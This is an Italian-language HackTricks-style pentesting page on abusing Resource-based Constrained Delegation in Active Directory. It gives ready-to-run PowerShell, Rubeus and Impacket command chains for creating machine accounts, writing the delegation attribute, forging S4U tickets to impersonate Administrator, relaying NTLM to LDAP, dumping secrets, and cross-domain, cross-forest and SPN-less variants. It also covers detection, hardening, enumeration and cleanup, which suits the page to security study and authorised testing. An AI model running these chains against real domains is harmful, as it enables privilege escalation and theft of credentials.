# Resource-based Constrained Delegation

{{#include ../../banners/hacktricks-training.md}}


## Nozioni di base sulla Resource-based Constrained Delegation

La Resource-based constrained delegation (RBCD) è simile alla [constrained delegation](constrained-delegation.md), ma la direzione della fiducia è invertita. La constrained delegation tradizionale registra a quali servizi un principal può delegare; la RBCD registra sulla **risorsa di destinazione** quali principal possono impersonare utenti presso di essa.<sup>[[12]](#references)</sup>

L'attributo _**msDS-AllowedToActOnBehalfOfOtherIdentity**_ dell'oggetto di destinazione contiene un security descriptor che identifica i principal autorizzati ad agire per conto di altre identità su quella risorsa.

Un'altra differenza importante è che un principal con **permessi di scrittura sufficienti su un account macchina** (`GenericAll`, `GenericWrite`, `WriteDacl`, `WriteProperty` e diritti simili) potrebbe essere in grado di impostare _**msDS-AllowedToActOnBehalfOfOtherIdentity**_. La configurazione della constrained delegation tradizionale richiede normalmente un accesso amministrativo più privilegiato.<sup>[[1]](#references)</sup>

Più precisamente, la modifica delle impostazioni classiche di constrained delegation è normalmente subordinata a `SeEnableDelegationPrivilege` su un domain controller, un diritto solitamente detenuto da amministratori con privilegi elevati. La RBCD sposta la decisione sul security descriptor dell'oggetto di destinazione, quindi l'accesso in scrittura alla proprietà pertinente dell'oggetto computer può essere sufficiente, senza bisogno di quel diritto utente.<sup>[[1]](#references)[[2]](#references)</sup>

### Nuovi concetti

Il flag **`TrustedToAuthForDelegation`** in `userAccountControl` viene spesso descritto come un prerequisito per **S4U2Self**, ma questa descrizione è incompleta.\
Un service principal con uno SPN può richiedere S4U2Self anche senza il flag. Con `TrustedToAuthForDelegation`, il service ticket restituito è **forwardable**; senza, il ticket è normalmente **non-forwardable**.<sup>[[5]](#references)</sup>

La constrained delegation tradizionale rifiuta un **TGS non-forwardable** durante il passaggio S4U2Proxy. La RBCD può accettare quel ticket S4U2Self se il security descriptor della destinazione autorizza il servizio richiedente.<sup>[[1]](#references)[[2]](#references)[[16]](#references)</sup>

### Struttura dell'attacco

> Se disponi di **privilegi equivalenti alla scrittura** su un **account computer**, potresti riuscire a ottenere accesso privilegiato a quella macchina.

Supponiamo che l'attaccante disponga già di **privilegi equivalenti alla scrittura sull'oggetto computer della vittima**.

1. L'attaccante **compromette** un account con uno **SPN** oppure **ne crea uno** ("Service A"). Per impostazione predefinita, un utente di dominio autenticato può creare fino a 10 oggetti computer, come stabilito da **_MachineAccountQuota_**; un oggetto computer fornisce automaticamente SPN utilizzabili.
2. L'attaccante **sfrutta il proprio privilegio WRITE** sul computer della vittima (ServiceB) per configurare la **resource-based constrained delegation e consentire a ServiceA di impersonare qualsiasi utente** nei confronti di quel computer (ServiceB).
3. L'attaccante usa Rubeus per eseguire un **attacco S4U completo** (S4U2Self e S4U2Proxy) da Service A a Service B per un utente **con accesso privilegiato a Service B**.
   1. S4U2Self (dall'account SPN compromesso o creato): richiedere un **TGS che rappresenti Administrator per Service A** (non-forwardable).
   2. S4U2Proxy: usare quel **TGS non-forwardable** per richiedere un service ticket che rappresenti **Administrator** verso l'**host vittima**.
   3. Il ticket non-forwardable può comunque funzionare in questo flusso RBCD perché Service A è autorizzato nel security descriptor della risorsa di destinazione.
4. L'attaccante può eseguire **pass-the-ticket** e **impersonare** l'utente per ottenere **accesso a ServiceB sulla macchina vittima**.<sup>[[1]](#references)</sup>

`MachineAccountQuota=0` chiude il percorso predefinito di creazione dei computer, ma non rimuove i diritti di scrittura sull'oggetto computer di destinazione né il controllo di un account esistente. Talvolta è possibile usare come principal delegante un utente ordinario controllato che non dispone di uno SPN, tramite il [metodo U2U senza SPN](#spn-less-cross-domain--cross-forest-rbcd), anche all'interno di un singolo dominio. Questo percorso richiede comunque un diritto effettivo di scrittura RBCD, il controllo delle credenziali dell'utente delegante, un'identità impersonata delegabile, un comportamento di cifratura Kerberos compatibile e una modifica dell'hash NT che interrompe il funzionamento dell'account. Considerali prerequisiti distinti: un attributo RBCD vuoto o una quota pari a zero, da soli, non dimostrano né il successo né la sicurezza.

Un descriptor RBCD esistente può anche indicare un **gruppo** invece del computer delegante direttamente. Se controlli un account computer con SPN e puoi aggiungerlo a quel gruppo, la nuova appartenenza potrebbe fornire il percorso di delega senza modificare l'attributo RBCD del computer di destinazione. Prima di concludere che il percorso funziona, verifica l'ACL effettiva che consente di modificare l'appartenenza al gruppo (inclusi gli ACE di negazione), l'appartenenza annidata e l'aggiornamento del token, il SID trustee del descriptor, le restrizioni di delega dell'account impersonato e lo SPN del servizio di destinazione.

Per verificare il valore di _**MachineAccountQuota**_ del dominio, puoi usare:

```bash
Get-DomainObject -Identity "dc=domain,dc=local" -Domain domain.local | select MachineAccountQuota
```

## Attacco

### Creazione di un oggetto computer

Puoi creare un oggetto computer nel dominio usando **[powermad](https://github.com/Kevin-Robertson/Powermad):**<sup>[[3]](#references)[[4]](#references)</sup>

```bash
import-module powermad
New-MachineAccount -MachineAccount SERVICEA -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose

# Check if created
Get-DomainComputer SERVICEA
```

### Configurazione della delega vincolata basata sulle risorse

**Utilizzando il modulo PowerShell di Active Directory**<sup>[[4]](#references)</sup>

```bash
Set-ADComputer $targetComputer -PrincipalsAllowedToDelegateToAccount SERVICEA$ #Assign delegation privileges
Get-ADComputer $targetComputer -Properties PrincipalsAllowedToDelegateToAccount #Check that it worked
```

**Uso di powerview**<sup>[[3]](#references)</sup>

```bash
$ComputerSid = Get-DomainComputer FAKECOMPUTER -Properties objectsid | Select -Expand objectsid
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$ComputerSid)"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)
Get-DomainComputer $targetComputer | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}

#Check that it worked
Get-DomainComputer $targetComputer -Properties 'msds-allowedtoactonbehalfofotheridentity'

msds-allowedtoactonbehalfofotheridentity
----------------------------------------
{1, 0, 4, 128...}
```

### Eseguire un attacco S4U completo (Windows/Rubeus)

Per prima cosa, abbiamo creato il nuovo oggetto Computer con la password `123456`, quindi ci serve l'hash di quella password:<sup>[[3]](#references)[[4]](#references)</sup>

```bash
.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local
```

Questo stamperà gli hash RC4 e AES per quell'account.\
Ora è possibile eseguire l'attacco:<sup>[[3]](#references)[[4]](#references)</sup>

```bash
rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<aes256 hash> /aes128:<aes128 hash> /rc4:<rc4 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /domain:domain.local /ptt
```

Puoi generare più ticket per più servizi con una sola richiesta usando il parametro `/altservice` di Rubeus:

```bash
rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<AES 256 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /altservice:krbtgt,cifs,host,http,winrm,RPCSS,wsman,ldap /domain:domain.local /ptt
```

> [!CAUTION]
> Gli utenti possono essere contrassegnati con **"Account is sensitive and cannot be delegated."** Se questo flag è abilitato, l'account non può essere impersonato tramite questo flusso di delega. BloodHound mostra questa proprietà durante l'analisi.

### Strumenti Linux: RBCD end-to-end con Impacket (2024+)

Se operi da Linux, puoi eseguire l'intera catena RBCD usando gli strumenti ufficiali di Impacket:<sup>[[6]](#references)[[7]](#references)</sup>

```bash
# 1) Create attacker-controlled machine account (respects MachineAccountQuota)
impacket-addcomputer -computer-name 'FAKE01$' -computer-pass 'P@ss123' -dc-ip 192.168.56.10 'domain.local/jdoe:Summer2025!'

# 2) Grant RBCD on the target computer to FAKE01$
#    -action write appends/sets the security descriptor for msDS-AllowedToActOnBehalfOfOtherIdentity
impacket-rbcd -delegate-to 'VICTIM$' -delegate-from 'FAKE01$' -dc-ip 192.168.56.10 -action write 'domain.local/jdoe:Summer2025!'

# 3) Request an impersonation ticket (S4U2Self+S4U2Proxy) for a privileged user against the victim service
impacket-getST -spn cifs/victim.domain.local -impersonate Administrator -dc-ip 192.168.56.10 'domain.local/FAKE01$:P@ss123'

# 4) Use the ticket (ccache) against the target service
export KRB5CCNAME=$(pwd)/Administrator.ccache
# Example: dump local secrets via Kerberos (no NTLM)
impacket-secretsdump -k -no-pass Administrator@victim.domain.local
```

Note
- Se la firma LDAP/LDAPS è obbligatoria, usa `impacket-rbcd -use-ldaps ...`.
- Preferisci le chiavi AES; molti domini moderni limitano RC4. Impacket e Rubeus supportano entrambi flussi solo-AES.
- Impacket può riscrivere `sname` ("AnySPN") per alcuni strumenti, ma quando possibile ottieni lo SPN corretto (ad es. CIFS/LDAP/HTTP/HOST/MSSQLSvc).

### RBCD riflessiva per un delegante Kerberos-only senza SPN

Un utente compromesso con **`msDS-AllowedToDelegateTo` ma senza SPN o `TrustedToAuthForDelegation`** non può produrre il ticket di prova forwardable necessario per la [delega vincolata Kerberos-only](constrained-delegation.md#protocol-transition-vs-kerberos-only-constrained-delegation) usando il normale S4U2Self.<sup>[[1]](#references)[[18]](#references)</sup> Se l'utente può modificare l'attributo RBCD sul proprio oggetto AD, un account controllato dall'attaccante e dotato di SPN può prima delegare *all'utente*.<sup>[[1]](#references)[[18]](#references)</sup> Questo passaggio RBCD produce un ticket forwardable per l'utente impersonato, destinato all'account senza SPN, che diventa una prova per una seconda richiesta S4U2Proxy verso uno SPN incluso nell'elenco di delega classica consentita dell'account compromesso.<sup>[[18]](#references)[[19]](#references)</sup>

Per il primo passaggio senza SPN, la richiesta S4U2Proxy dell'account helper deve usare **U2U**: `enc-tkt-in-skey` fa sì che il KDC cifri il ticket con la chiave di sessione del TGT del delegante, invece di cercare una chiave associata a uno SPN.<sup>[[18]](#references)[[19]](#references)</sup> Il KDC necessita anche del bit RBCD in `PA-PAC-OPTIONS`, del TGT del delegante e del ticket di prova S4U2Self.<sup>[[18]](#references)[[20]](#references)</sup> Il fork di Impacket `getST.py` dell'autore aggiunge `-nospn` e `-tgt` per questa richiesta; il supporto a `-nospn`/`-tgt` è nella PR #2324 di Impacket upstream, quindi usa il fork collegato invece di presumere che `getST.py` standard supporti questo passaggio.<sup>[[18]](#references)[[20]](#references)</sup>

Questo esempio presume che `svc_web` sia compromesso, possa modificare il proprio attributo RBCD e sia autorizzato a delegare a `host/dc01.corp.local`. Presume inoltre che sia possibile creare un helper con SPN, che RC4 sia consentito e che l'`Administrator` selezionato sia delegabile. Richiedi un **TGT RC4** usando l'hash NT dell'account compromesso. Esegui il **primo** `getST.py` del fork dell'autore; controlla l'output di `describeTicket.py` e sostituisci qui sotto la **chiave di sessione RC4 del TGT**. L'ultimo `getST.py` può essere quello standard di Impacket. Richiedi il TGT **prima** di modificare l'hash NT; questa modifica interrompe il servizio dell'account finché la password non viene reimpostata.<sup>[[17]](#references)[[18]](#references)[[19]](#references)[[20]](#references)</sup>

```bash
pypykatz crypto nt 'OldPass!'
getTGT.py -hashes ':<CURRENT_NT_HASH>' 'corp.local/svc_web' -dc-ip 10.0.0.10
describeTicket.py svc_web.ccache
addcomputer.py -computer-name 'HELPER$' -computer-pass 'HelperPass!' -dc-ip 10.0.0.10 'corp.local/svc_web:OldPass!'
rbcd.py -delegate-from 'HELPER$' -delegate-to svc_web -action write -dc-ip 10.0.0.10 'corp.local/svc_web:OldPass!'
changepasswd.py 'corp.local/svc_web:OldPass!@10.0.0.10' -newhashes ':<RC4_TGT_SESSION_KEY>'
python3 ./getST.py -u2u -impersonate Administrator -nospn svc_web -tgt svc_web.ccache -dc-ip 10.0.0.10 'corp.local/HELPER$:HelperPass!'
KRB5CCNAME=svc_web.ccache impacket-getST -impersonate Administrator -spn host/dc01.corp.local -additional-ticket 'Administrator@svc_web@CORP.LOCAL.ccache' -k -no-pass -dc-ip 10.0.0.10 'corp.local/svc_web'
```

A differenza del [percorso RBCD senza SPN qui sotto](#spn-less-cross-domain--cross-forest-rbcd), questa catena usa l'account senza SPN come **target RBCD e poi come delegatore KCD classico**. Serve comunque un altro account controllato con uno SPN. Se `MachineAccountQuota=0`, un account con SPN già controllato può sostituire il nuovo computer; la quota a zero, da sola, non impedisce questo percorso.<sup>[[18]](#references)[[19]](#references)</sup>

## RBCD tra domini e foreste

Se il **principal delegante** che controlli risiede in un **dominio diverso** (o persino in una **foresta diversa**) rispetto al **computer risorsa**, l'abuso è comunque **RBCD**, ma il flusso dei ticket non è più il consueto `S4U2Self -> S4U2Proxy` in un singolo dominio.

### RBCD tra domini: configura il principal esterno tramite SID

Quando imposti `msDS-AllowedToActOnBehalfOfOtherIdentity` da un **dominio diverso**, il computer/utente esterno potrebbe **non essere risolvibile tramite nome** in LDAP del dominio target. In tal caso, configura la voce di delega usando il **SID** del principal esterno invece del suo sAMAccountName/UPN.

Questo è particolarmente rilevante quando si esegue il relay di NTLM verso LDAP con `ntlmrelayx.py`:<sup>[[9]](#references)</sup>

```bash
sudo ntlmrelayx.py -smb2support -t ldap://192.168.90.217 \
  --no-dump --no-da --no-validate-privs \
  --delegate-access \
  --escalate-user S-1-5-21-3104832133-133926542-3798009529-1106 \
  --sid
```

Note:
- `--sid` indica a `ntlmrelayx.py` di trattare `--escalate-user` come un SID, necessario quando l'account delegante appartiene a un dominio diverso da quello di destinazione.
- Anche se lo strumento stampa `User not found in LDAP`, la scrittura della delega può comunque riuscire perché il security descriptor memorizza direttamente il SID esterno.

### RBCD cross-domain: sequenza S4U cross-realm

Una volta che il principal esterno è in `msDS-AllowedToActOnBehalfOfOtherIdentity`, il flusso cross-domain funzionante è:<sup>[[9]](#references)[[13]](#references)</sup>

1. Ottenere un **TGT** per il principal delegante dal suo dominio.
2. Richiedere un **TGT di referral** per `krbtgt/<target-domain>`.
3. Richiedere un **referral S4U2Self cross-realm** per l'utente impersonato sul DC del dominio di destinazione.
4. Richiedere il ticket **S4U2Self** effettivo per quell'utente nel dominio delegante.
5. Eseguire **S4U2Proxy** nel dominio delegante per ottenere un ticket di referral per il dominio di destinazione.
6. Eseguire l'ultimo **S4U2Proxy** sul DC del dominio di destinazione per ottenere il service ticket per `cifs/host.target`, `host/host.target` e così via.

Ecco perché i tool Linux standard spesso non funzionano con RBCD cross-domain:<sup>[[9]](#references)</sup>
- il **realm** della richiesta potrebbe dover essere diverso dal realm del TGT usato nel `TGS-REQ`
- la catena richiede **passaggi S4U2Proxy indipendenti**, non solo `S4U2Self` o `S4U2Self` seguito immediatamente da un singolo `S4U2Proxy`

### RBCD cross-domain da Linux

Synacktiv ha pubblicato un'implementazione di Impacket `getST.py` che riproduce da Linux la sequenza cross-realm gestendo esplicitamente i due KDC:<sup>[[9]](#references)[[11]](#references)</sup>

```bash
python3 ./getST.py dev.asgard.local/rbcd_test\$:R[...]5 -k \
  -dc-ip 192.168.90.131 \
  -targetdc 192.168.90.217 \
  -targetdomain asgard.local \
  -impersonate thor_adm \
  -spn cifs/workstation.asgard.local

KRB5CCNAME=thor_adm@cifs_workstation.asgard.local@ASGARD.LOCAL.ccache \
  ./smbclient.py "asgard.local/thor_adm@workstation.asgard.local" \
  -k -no-pass -dc-ip 192.168.90.217
```

Operativamente, i nuovi argomenti sono:
- `-dc-ip`: DC del dominio **delegante**
- `-targetdomain`: dominio del **computer risorsa**
- `-targetdc`: DC del dominio della **risorsa**

### Limitazioni di RBCD tra foreste

RBCD tra foreste ha un’importante limitazione: **l’utente impersonato deve appartenere alla stessa foresta del principal delegante**. In altre parole, se l’account computer che controlli è in `valhalla.local` e la risorsa di destinazione è in `asgard.local`, in genere **non puoi** impersonare utenti arbitrari di `asgard.local` su quella risorsa tramite RBCD.<sup>[[9]](#references)</sup>

È comunque sfruttabile quando:
- l’utente della **foresta delegante** è un **amministratore locale** (o ha altri privilegi) sull’host della risorsa nell’altra foresta
- una trust consente il percorso di autenticazione richiesto e il SID esterno è accettato nel security descriptor del computer di destinazione

### Peculiarità del protocollo RBCD tra foreste

RBCD tra foreste non è semplicemente «cross-domain più una trust». Il flusso osservato presenta due peculiarità che gli strumenti più comuni storicamente non gestiscono:<sup>[[9]](#references)</sup>

1. Una richiesta **S4U2Proxy** aggiuntiva che imposta **`PA-PAC-OPTIONS=branch-aware`**
2. Un ticket di servizio finale che può essere restituito usando **RC4**, anche quando erano stati richiesti altri etype

Il flusso pratico è:

1. Ottieni un TGT per il principal delegante nella foresta A.
2. Richiedi **S4U2Self** per l’utente da impersonare nella foresta A.
3. Richiedi **S4U2Proxy** nella foresta A per ottenere un TGT di referral per la foresta B.
4. Invia una seconda richiesta **S4U2Proxy** nella foresta A **senza** il ticket S4U2Self come ticket aggiuntivo, ma con `branch-aware` abilitato, per ottenere un altro TGT di referral per la foresta B.
5. Facoltativamente, richiedi un normale ticket di servizio nella foresta B per il principal delegante (questo ticket non è necessario per l’abuso finale).
6. Usa i ticket di referral dei passaggi 3 e 4 per richiedere il ticket **S4U2Proxy** finale nella foresta B per l’utente della foresta A da impersonare, verso lo SPN di destinazione.

### RBCD tra foreste da Linux

Lo stesso branch di Impacket di Synacktiv aggiunge uno switch `-forest` per questa logica:<sup>[[9]](#references)[[11]](#references)</sup>

```bash
python3 ./getST.py -spn 'cifs/workstation.asgard.local' \
  -impersonate 'v_thor' \
  -dc-ip VALHALLA.local \
  valhalla.local/'desktop$' \
  -targetdc ASGARD.local \
  -targetdomain asgard.local \
  -aesKey 4[...]f \
  -forest
```

### RBCD ricorsivo multi-dominio (3+ domini)

Nelle **foreste multi-dominio**, sia **S4U2Self** sia **S4U2Proxy** possono essere **ricorsivi** invece di fermarsi dopo un referral:

- **S4U2Self ricorsivo**: il primo `S4U2Self` viene inviato al **dominio dell'utente impersonato**, si attraversano i passaggi intermedi tra domini padre/figlio usando i referral `TGS-REQ` standard per `krbtgt/<REALM>` e l'**`S4U2Self` finale** viene inviato nel **dominio del principal delegante**.
- Questo significa che **il solo possesso di un TGT** per un account macchina può bastare per impersonare un **amministratore di un altro dominio della stessa foresta** e richiedere `cifs/host`, `host/host`, `wsman/host`, ecc.
- **S4U2Proxy ricorsivo** segue la catena di trust allo stesso modo: i passaggi intermedi riutilizzano il ticket precedente come TGT mentre richiedono il referral `krbtgt/<REALM>` successivo; solo l'ultimo passaggio restituisce il ticket di servizio finale.<sup>[[10]](#references)</sup>

Un esempio pratico nella stessa foresta è:

```bash
KRB5CCNAME=MIN-FRPERSO-01\$.ccache getST.py 'minus.sub.frperso.local/MIN-FRPERSO-01$' -k -no-pass \
  -impersonate Administrator@frperso.local -self \
  -altservice cifs/min-frperso-01.minus.sub.frperso.local

KRB5CCNAME=Administrator@frperso.local@cifs_min-frperso-01.minus.sub.frperso.local@MINUS.SUB.FRPERSO.LOCAL.ccache \
  smbclient.py frperso.local/Administrator@min-frperso-01.minus.sub.frperso.local -k -no-pass
```

### RBCD senza SPN tra domini / tra foreste

Se il **principal delegante è un utente senza SPN**, l'ultimo `S4U2Self` ricorsivo non va a buon fine con **`KDC_ERR_S_PRINCIPAL_UNKNOWN`**. La soluzione alternativa consiste nel **riprovare solo l'ultimo passaggio come `S4U2Self+U2U`**.<sup>[[10]](#references)</sup>

Versione breve della catena di abuso:

1. Autenticarsi con l'**hash NT** per indurre il KDC a usare **RC4-HMAC (etype 23)**.
2. Richiedere prima **`-self -u2u`** e conservare quel ticket separatamente dal successivo passaggio proxy.
3. Estrarre la **chiave di sessione del TGT** con `describeTicket.py`.
4. Sostituire l'**hash NT** dell'utente con quella **chiave di sessione** usando `changepasswd.py -newhashes <session_key>`.
5. Riutilizzare il ticket **`S4U2Self+U2U`** come **`-additional-ticket`** durante una richiesta **`-proxy`** separata.

```bash
getST.py sub.frperso.local/Administrator -hashes ':<nthash>' \
  -impersonate Administrator@frperso.local -self -u2u
describeTicket.py Administrator.ccache
changepasswd.py sub.frperso.local/Administrator@sub-frperso-01.sub.frperso.local \
  -hashes ':<nthash>' -newhashes <tgt_session_key>
KRB5CCNAME=Administrator.ccache getST.py sub.frperso.local/Administrator -k -no-pass \
  -impersonate Administrator@frperso.local -proxy -proxydomain frpublic.local \
  -spn cifs/frpublic-01.frpublic.local -additional-ticket '<u2u_ticket.ccache>'
```

Avvertenze operative:

- Quando il **primo hop trusted è già un'altra forest**, preferisci l'algoritmo **branch-aware** (`getST.py ... -forest`) per corrispondere al comportamento nativo di Windows. Se la forest esterna viene raggiunta solo **più avanti** nella catena, il flusso ricorsivo non branch-aware potrebbe comunque funzionare.<sup>[[9]](#references)</sup>
- Sui DC recenti **Windows Server 2022/2025**, forzare RC4 può fallire con **`KDC_ERR_ETYPE_NOSUPP`** a causa della deprecazione di RC4; ciò può rendere impossibile l'RBCD **senza SPN**, anche se l'RBCD classico basato su SPN continua a funzionare con AES.<sup>[[15]](#references)</sup>
- Esegui **`S4U2Self+U2U` prima di modificare l'hash/la password dell'utente**: `SamrChangePasswordUser` **non ricalcola le chiavi AES Kerberos** dell'account, quindi modificare prima la password può compromettere le successive richieste di ticket.<sup>[[14]](#references)</sup>
- L'account impersonato deve essere ancora **delegabile**: **Protected Users** e gli account con **`NOT_DELEGATED`** / **"Account is sensitive and cannot be delegated"** bloccano la catena.

## Note sul rilevamento / hardening

- I percorsi RBCD tra domini/forest vengono ancora creati solitamente tramite **abuso di ACL** o **relay-to-LDAP**. Applica **LDAP signing** e **LDAP channel binding** sui DC per interrompere i comuni metodi di configurazione.
- Verifica chi può scrivere `msDS-AllowedToActOnBehalfOfOtherIdentity` sugli oggetti computer e risolvi i SID memorizzati, inclusi quelli dei **foreign security principals**.
- Negli ambienti con molti trust, verifica **Selective Authentication**, **SID filtering** e se utenti di una forest esterna dispongono di privilegi di **amministratore locale** sugli host delle risorse.

### Accesso

L'ultima riga di comando eseguirà l'**attacco S4U completo e inietterà in memoria il TGS** da Administrator all'host vittima.\
In questo esempio è stato richiesto un TGS per il servizio **CIFS** di Administrator, quindi potrai accedere a **C$**:

```bash
ls \\victim.domain.local\C$
```

### Abusare di ticket di servizio diversi

Scopri i [**ticket di servizio disponibili qui**](silver-ticket.md#available-services).

## Enumerazione, auditing e pulizia

### Enumerare i computer con RBCD configurato

PowerShell (decodifica dell’SD per risolvere i SID):

```powershell
# List all computers with msDS-AllowedToActOnBehalfOfOtherIdentity set and resolve principals
Import-Module ActiveDirectory
Get-ADComputer -Filter * -Properties msDS-AllowedToActOnBehalfOfOtherIdentity |
  Where-Object { $_."msDS-AllowedToActOnBehalfOfOtherIdentity" } |
  ForEach-Object {
    $raw = $_."msDS-AllowedToActOnBehalfOfOtherIdentity"
    $sd  = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $raw, 0
    $sd.DiscretionaryAcl | ForEach-Object {
      $sid  = $_.SecurityIdentifier
      try { $name = $sid.Translate([System.Security.Principal.NTAccount]) } catch { $name = $sid.Value }
      [PSCustomObject]@{ Computer=$_.ObjectDN; Principal=$name; SID=$sid.Value; Rights=$_.AccessMask }
    }
  }
```

Impacket (leggere o svuotare con un solo comando):

```bash
# Read who can delegate to VICTIM
impacket-rbcd -delegate-to 'VICTIM$' -action read 'domain.local/jdoe:Summer2025!'
```

### Pulizia / reimpostazione RBCD

- PowerShell (cancella l'attributo):

```powershell
Set-ADComputer $targetComputer -Clear 'msDS-AllowedToActOnBehalfOfOtherIdentity'
# Or using the friendly property
Set-ADComputer $targetComputer -PrincipalsAllowedToDelegateToAccount $null
```

- Impacket:

```bash
# Remove a specific principal from the SD
impacket-rbcd -delegate-to 'VICTIM$' -delegate-from 'FAKE01$' -action remove 'domain.local/jdoe:Summer2025!'
# Or flush the whole list
impacket-rbcd -delegate-to 'VICTIM$' -action flush 'domain.local/jdoe:Summer2025!'
```

## Errori Kerberos

- **`KDC_ERR_ETYPE_NOTSUPP`**: significa che Kerberos è configurato per non usare DES o RC4 e stai fornendo solo l'hash RC4. Fornisci a Rubeus almeno l'hash AES256 (oppure fornisci semplicemente gli hash RC4, AES128 e AES256). Esempio: `[Rubeus.Program]::MainString("s4u /user:FAKECOMPUTER /aes256:CC648CF0F809EE1AA25C52E963AC0487E87AC32B1F71ACC5304C73BF566268DA /aes128:5FC3D06ED6E8EA2C9BB9CC301EA37AD4 /rc4:EF266C6B963C0BB683941032008AD47F /impersonateuser:Administrator /msdsspn:CIFS/M3DC.M3C.LOCAL /ptt".split())`
- **`KDC_ERR_S_PRINCIPAL_UNKNOWN`** durante `-self` per un utente normale: probabilmente il principal delegante **non ha un SPN**. Riprova l'**ultimo hop** usando **`S4U2Self+U2U`** invece di un normale `S4U2Self`.<sup>[[10]](#references)</sup>
- **`KDC_ERR_ETYPE_NOSUPP`** durante RBCD **senza SPN**: i DC recenti potrebbero rifiutare il percorso **RC4-HMAC** forzato, necessario per la tecnica `S4U2Self+U2U` + sostituzione della chiave di sessione. Prova invece un percorso RBCD classico **con SPN** e AES.<sup>[[10]](#references)[[15]](#references)</sup>
- **`KRB_AP_ERR_SKEW`**: significa che l'ora del computer corrente è diversa da quella del DC e Kerberos non funziona correttamente.
- **`preauth_failed`**: significa che il nome utente e gli hash forniti non consentono l'accesso. Potresti aver dimenticato di includere il carattere "$" nel nome utente durante la generazione degli hash (`.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local`)
- **`KDC_ERR_BADOPTION`** durante S4U2Proxy: controlla le limitazioni alla delega dell'account impersonato, il flag forwardable del ticket di evidenza e se KCD classico o il descrittore RBCD del target autorizzano questo hop. È un **errore relativo ai criteri di delega del KDC**, non un test per verificare se il servizio target è in esecuzione o se l'utente dispone di accesso a livello applicativo. Un SPN target non registrato normalmente genera invece **`KDC_ERR_S_PRINCIPAL_UNKNOWN`**.<sup>[[21]](#references)[[22]](#references)</sup>

## Note, relay e alternative

- Puoi anche scrivere l'SD RBCD tramite AD Web Services (ADWS) se LDAP è filtrato. Vedi:


{{#ref}}
adws-enumeration.md
{{#endref}}

- Le catene di relay Kerberos spesso terminano con RBCD per ottenere SYSTEM locale con un solo passaggio. Vedi esempi pratici end-to-end:


{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

- Se LDAP signing/channel binding sono **disabilitati** e puoi creare un account computer, strumenti come **KrbRelayUp** possono inoltrare a LDAP un'autenticazione Kerberos forzata, impostare `msDS-AllowedToActOnBehalfOfOtherIdentity` per il tuo account computer sull'oggetto computer target e impersonare immediatamente **Administrator** tramite S4U da un host esterno.<sup>[[8]](#references)</sup>

## References

- [1] [Scodinzolare con il cane: abusare della delega vincolata basata sulle risorse per attaccare Active Directory](https://eladshamir.com/2019/01/28/Wagging-the-Dog.html)
- [2] [Un'altra parola sulla delega – harmj0y](https://blog.harmj0y.net/redteaming/another-word-on-delegation/)
- [3] [Delega vincolata basata sulle risorse Kerberos: acquisizione dell'oggetto computer](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution#modifying-target-computers-ad-object)
- [4] [Netwrix – Abuso della delega vincolata basata sulle risorse](https://netwrix.com/en/resources/blog/resource-based-constrained-delegation-abuse/)
- [5] [Kerberosity ha ucciso il dominio: panoramica offensiva di Kerberos](https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61)
- [6] [Impacket rbcd.py (ufficiale)](https://github.com/fortra/impacket/blob/master/examples/rbcd.py)
- [7] [Cheat sheet rapido per Linux con sintassi aggiornata](https://tldrbins.github.io/rbcd/)
- [8] [0xdf – HTB Bruno (LDAP signing disattivato → relay Kerberos a RBCD)](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)
- [9] [Synacktiv - Analisi di RBCD tra domini e foreste](https://www.synacktiv.com/en/publications/exploring-cross-domain-cross-forest-rbcd.html)
- [10] [Synacktiv - Analisi di RBCD tra domini e foreste: parte 2](https://www.synacktiv.com/en/publications/exploring-cross-domain-cross-forest-rbcd-part-2.html)
- [11] [Branch Impacket di Synacktiv - cross_forest_rbcd](https://github.com/synacktiv/impacket/tree/cross_forest_rbcd)
- [12] [Microsoft Learn - Panoramica della delega vincolata Kerberos](https://learn.microsoft.com/en-us/windows-server/security/kerberos/kerberos-constrained-delegation-overview)
- [13] [Specifiche aperte Microsoft - S4U2Self tra domini](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-sfu/f35b6902-6f5e-4cd0-be64-c50bbaaf54a5)
- [14] [Specifiche aperte Microsoft - SamrChangePasswordUser](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-samr/9699d8ca-e1a4-433c-a8c3-d7bebeb01476)
- [15] [Microsoft Learn - Rilevare e correggere l'uso di RC4 in Kerberos](https://learn.microsoft.com/en-us/windows-server/security/kerberos/detect-remediate-rc4-kerberos)
- [16] [Specifiche aperte Microsoft – Dettagli di S4U2Proxy](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-sfu/bde93b0e-f3c9-4ddf-9cd5-e9c237331c90)
- [17] [James Forshaw - Sfruttare RBCD usando un normale account utente](https://www.tiraniddo.dev/2022/05/exploiting-rbcd-using-normal-user.html)
- [18] [Hunter Wade - Abusare della delega vincolata senza transizione di protocollo con account senza SPN](https://hunio.org/security/abusing-constrained-delegation-without-protocol-transition-against-spn-less-accounts/)
- [19] [Sprocket Security - Abusare della delega vincolata senza transizione di protocollo con account senza SPN](https://www.sprocketsecurity.com/blog/abusing-constrained-delegation-without-protocol-transition-against-spn-less-accounts)
- [20] [Impacket PR #2324 - S4U2Proxy con U2U](https://github.com/fortra/impacket/pull/2324)
